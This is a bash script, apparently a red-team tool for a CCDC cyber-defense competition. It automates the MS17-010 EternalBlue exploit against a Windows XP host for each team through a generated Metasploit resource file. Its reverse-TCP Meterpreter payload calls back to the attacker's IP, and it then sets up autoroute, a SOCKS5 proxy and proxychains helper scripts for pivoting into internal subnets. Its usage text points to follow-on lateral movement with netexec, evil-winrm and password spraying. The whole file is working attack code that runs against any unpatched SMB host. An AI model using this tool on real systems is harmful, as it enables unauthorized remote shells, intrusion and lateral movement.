#!/bin/bash
# ================================================
# CCDC EternalBlue Meterpreter + Proxychains (Adventure XP Box)
# Usage: ./ligo.sh <team | all> [attacker_ip] [-l lport] [-s socks_port]
#
# Exploits MS17-010 on the Adventure XP box (.72) to get a
# Meterpreter session, sets up SOCKS proxy via autoroute,
# then generates a proxychains config + helper script per team.
#
# The XP box becomes the primary pivot into the 172.16.x.x
# internal network — no credentials needed.
#
# SOCKS port defaults to 109<TEAM> (e.g. 1095 for team 5).
# pivot.sh uses 108<TEAM> for Sliver — no conflict.
#
# Supports "all" to exploit teams 1-5 sequentially.
# ================================================

set -uo pipefail

usage() {
  echo "Usage: $0 <team | all> [attacker_ip] [-l lport] [-s socks_port]"
  echo ""
  echo "Flags:"
  echo "  -l PORT  Meterpreter reverse shell listen port (default: 4440+team)"
  echo "  -s PORT  SOCKS5 proxy port (default: 109<team>, e.g. 1095 for team 5)"
  echo ""
  echo "Examples:"
  echo "  $0 5                         # exploit team 5 XP box"
  echo "  $0 all                       # exploit teams 1-5"
  echo "  $0 5 10.10.13.37             # specify attacker IP"
  echo "  $0 5 -l 5555                 # custom rev shell port"
  echo "  $0 5 10.10.13.37 -l 5555 -s 2080  # custom everything"
  exit 1
}

if [[ $# -lt 1 ]]; then usage; fi

ARG="$1"; shift

# Grab optional positional attacker_ip (before any flags)
ATTACKER_IP=""
if [[ $# -gt 0 && "$1" != -* ]]; then
  ATTACKER_IP="$1"; shift
fi

# Parse optional flags
CUSTOM_LPORT=""
CUSTOM_SOCKS=""
while getopts "l:s:" opt; do
  case "$opt" in
    l) CUSTOM_LPORT="$OPTARG" ;;
    s) CUSTOM_SOCKS="$OPTARG" ;;
    *) usage ;;
  esac
done

# Auto-detect attacker IP if not provided
if [[ -z "$ATTACKER_IP" ]]; then
  ATTACKER_IP="$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '127.0.0.1' | head -n1)"
fi

DOMAIN="aperturesciencelabs.org"

# Internal subnets reachable through the XP pivot
INTERNAL_SUBNETS=("172.16.1.0/24" "172.16.2.0/24" "172.16.3.0/24")

# ====================== INTERNAL HOST MAP ======================
# hostname → internal IP (same across all teams)
declare -A INTERNAL_IP=(
  ["schrodinger_dmz"]="172.16.1.1"
  ["schrodinger_internal"]="172.16.2.1"
  ["schrodinger_workstation"]="172.16.3.1"
  ["curiosity"]="172.16.3.140"
  ["morality"]="172.16.1.10"
  ["intelligence"]="172.16.1.11"
  ["anger"]="172.16.2.70"
  ["fact"]="172.16.2.71"
  ["space"]="172.16.3.141"
  ["adventure"]="172.16.2.72"
)

# ====================== EXPLOIT ONE TEAM ======================
exploit_team() {
  local TEAM="$1"
  local TARGET="192.168.20${TEAM}.72"
  local SOCKS_PORT="${CUSTOM_SOCKS:-109${TEAM}}"
  local LPORT="${CUSTOM_LPORT:-$((4440 + TEAM))}"

  echo ""
  echo "[+] ================================================"
  echo "[+] EternalBlue → TEAM ${TEAM} | Adventure XP (${TARGET})"
  echo "[+] Attacker: ${ATTACKER_IP} | LPORT: ${LPORT}"
  echo "[+] SOCKS5 will be on 127.0.0.1:${SOCKS_PORT}"
  echo "[+] ================================================"

  # Check for port conflicts (pivot.sh uses 108<TEAM>, warn if our port clashes)
  if ss -tlnp 2>/dev/null | grep -q ":${SOCKS_PORT} "; then
    echo "[!] WARNING: Port ${SOCKS_PORT} is already in use!"
    echo "    Another pivot (pivot.sh/ligo.sh) may be running on this port."
    echo "    Use -s <port> to pick a different SOCKS port."
    echo ""
    read -rp "    Continue anyway? [y/N] " ans
    [[ "${ans,,}" != "y" ]] && { echo "[-] Aborted."; return 1; }
  fi
  if ss -tlnp 2>/dev/null | grep -q ":${LPORT} "; then
    echo "[!] WARNING: LPORT ${LPORT} is already in use!"
    echo "    Use -l <port> to pick a different reverse shell port."
    echo ""
    read -rp "    Continue anyway? [y/N] " ans
    [[ "${ans,,}" != "y" ]] && { echo "[-] Aborted."; return 1; }
  fi

  # Check target reachable on 445
  if ! timeout 3 bash -c "echo >/dev/tcp/${TARGET}/445" 2>/dev/null; then
    echo "[-] Cannot reach ${TARGET}:445 — skipping team ${TEAM}"
    return 1
  fi
  echo "[+] Target reachable on SMB"

  # Generate Metasploit resource file
  local RC_FILE="ligo_team${TEAM}.rc"
  cat > "$RC_FILE" << EOF
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS ${TARGET}
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ${ATTACKER_IP}
set LPORT ${LPORT}
set TARGET 0
set AutoRunScript "multi_console_command -cl 'run post/multi/manage/autoroute SUBNET=172.16.0.0 NETMASK=255.255.0.0','run auxiliary/server/socks_proxy VERSION=5 SRVPORT=${SOCKS_PORT} SRVHOST=127.0.0.1'"
exploit -j -z
EOF

  echo "[+] Generated ${RC_FILE}"
  echo "[*] Launching Metasploit (backgrounded)..."
  msfconsole -q -r "$RC_FILE" &
  local MSF_PID=$!

  # Wait for SOCKS proxy to come up (poll for up to 60s)
  echo "[*] Waiting for SOCKS5 proxy on 127.0.0.1:${SOCKS_PORT}..."
  local waited=0
  while ! ss -tlnp 2>/dev/null | grep -q ":${SOCKS_PORT}" && [[ $waited -lt 60 ]]; do
    sleep 3
    ((waited+=3))
  done

  if ss -tlnp 2>/dev/null | grep -q ":${SOCKS_PORT}"; then
    echo "[+] SOCKS5 proxy is UP on 127.0.0.1:${SOCKS_PORT}"
  else
    echo "[!] SOCKS5 not detected yet — Metasploit may still be exploiting"
    echo "    Check the msfconsole window. Once you get a session, run manually:"
    echo "    run post/multi/manage/autoroute SUBNET=172.16.0.0 NETMASK=255.255.0.0"
    echo "    run auxiliary/server/socks_proxy VERSION=5 SRVPORT=${SOCKS_PORT} SRVHOST=127.0.0.1"
  fi

  # ---- Generate proxychains config ----
  local PC_CONF="proxychains_team${TEAM}.conf"
  cat > "$PC_CONF" << EOF
# Proxychains config for Team ${TEAM}
# SOCKS5 via Meterpreter autoroute on Adventure XP pivot
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 ${SOCKS_PORT}
EOF

  echo "[+] Created ${PC_CONF}"

  # ---- Generate per-team helper script ----
  local HELPER="team${TEAM}_proxy.sh"
  cat > "$HELPER" << 'HELPER_HEADER'
#!/bin/bash
# ================================================
# Team PROXYCHAINS_TEAM Proxychains Helper
# Source this: source PROXYCHAINS_HELPER
# Or run commands: ./PROXYCHAINS_HELPER <command>
# ================================================
HELPER_HEADER

  # Replace placeholders with actual values
  cat >> "$HELPER" << HELPER_BODY

TEAM="${TEAM}"
SOCKS_PORT="${SOCKS_PORT}"
SCRIPT_DIR="\$(cd "\$(dirname "\${BASH_SOURCE[0]:-\$0}")" && pwd)"
PC_CONF="\${SCRIPT_DIR}/${PC_CONF}"

# Internal IP map
declare -A HOST=(
  ["schrodinger_dmz"]="172.16.1.1"
  ["schrodinger_internal"]="172.16.2.1"
  ["schrodinger_workstation"]="172.16.3.1"
  ["curiosity"]="172.16.3.140"
  ["morality"]="172.16.1.10"
  ["intelligence"]="172.16.1.11"
  ["anger"]="172.16.2.70"
  ["fact"]="172.16.2.71"
  ["space"]="172.16.3.141"
  ["adventure"]="172.16.2.72"
)

if [[ "\${BASH_SOURCE[0]}" == "\${0}" ]]; then
  # Called as a script — proxy the given command
  if [[ \$# -eq 0 ]]; then
    echo "Usage: \$0 <command> [args...]"
    echo "  e.g. \$0 netexec smb 172.16.3.140 -u Administrator -p 'pass'"
    echo ""
    echo "Or source this file to get aliases:"
    echo "  source \$0"
    echo ""
    echo "Internal hosts:"
    for h in curiosity morality intelligence anger fact space adventure; do
      printf "  %-15s %s\n" "\$h" "\${HOST[\$h]}"
    done
    exit 0
  fi
  exec proxychains4 -q -f "\$PC_CONF" "\$@"
else
  # Sourced — set up aliases
  alias pc${TEAM}="proxychains4 -q -f \${PC_CONF}"
  alias p${TEAM}="proxychains4 -q -f \${PC_CONF}"

  # Convenience: export the config path
  export PROXYCHAINS_TEAM${TEAM}_CONF="\${PC_CONF}"

  echo "[+] Team ${TEAM} proxychains aliases ready:"
  echo "    pc${TEAM} <command>        — run anything through the pivot"
  echo "    p${TEAM} <command>         — shorthand"
  echo ""
  echo "    Internal hosts:"
  for h in curiosity morality intelligence anger fact space adventure; do
    printf "      %-15s %s\n" "\$h" "\${HOST[\$h]}"
  done
fi
HELPER_BODY

  chmod +x "$HELPER"
  echo "[+] Created ${HELPER}"
  echo ""
  echo "[+] ================================================"
  echo "[+] TEAM ${TEAM} PIVOT READY"
  echo "[+] ================================================"
  echo ""
  echo "  Quick start:"
  echo "    source ${HELPER}                    # get pc${TEAM}/p${TEAM} aliases"
  echo "    pc${TEAM} netexec smb 172.16.3.140  # hit the DC"
  echo "    pc${TEAM} evil-winrm -i 172.16.1.10 -u Administrator -p 'pass'"
  echo ""
  echo "  Or use -x flag on other scripts to use internal IPs through proxychains:"
  echo "    proxychains4 -q -f ${PC_CONF} ./exec.sh ${TEAM} -x curiosity"
  echo "    proxychains4 -q -f ${PC_CONF} ./spray.sh ${TEAM} -x"
  echo ""
}

# ====================== MAIN ======================
if [[ "$ARG" == "all" || "$ARG" == "All" ]]; then
  echo "[*] Exploiting ALL teams (1-5)..."
  for t in {1..5}; do
    exploit_team "$t"
  done
  echo ""
  echo "[*] All teams processed."
  echo "[*] Helper scripts: team1_proxy.sh .. team5_proxy.sh"
else
  if ! [[ "$ARG" =~ ^[0-9]+$ ]]; then
    echo "[-] Invalid team number"
    exit 1
  fi
  exploit_team "$ARG"
fi